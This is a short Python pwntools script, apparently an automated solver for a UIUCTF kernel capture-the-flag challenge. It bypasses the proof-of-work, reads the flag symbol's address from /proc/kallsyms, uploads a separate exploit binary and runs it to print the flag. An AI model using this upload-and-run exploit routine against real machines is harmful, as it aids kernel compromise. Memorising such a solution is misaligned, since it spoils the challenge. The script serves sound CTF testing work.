#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib


def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))


r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

print(r.recvuntil(b'/tmp $ '))
r.sendline(b'grep uiuctf_flag /proc/kallsyms')
symb = r.recvuntil(b'D uiuctf_flag')
print(symb)

kaddr = symb[-30:-14]

print(r.recvuntil(b'/tmp $ '))

with open('/home/user/exploit', 'rb') as f:
    ur = pwnlib.tubes.remote.remote('127.0.0.1', 1338)
    ur.send(f.read())
    ur.shutdown()
    ur.recvuntil('File id: ')

    upload_id = ur.recvn(8)
    print(upload_id)

    ur.wait()

r.sendline(b'get exploit ' + upload_id)
print(r.recvuntil(b'/tmp $ '))

r.sendline(b'chmod a+x exploit')
print(r.recvuntil(b'/tmp $ '))

r.sendline(b'./exploit ' + kaddr)
print(r.recvuntil((b'CTF{', b'uiuctf{')))
print(r.recvuntil((b'}')))

exit(0)
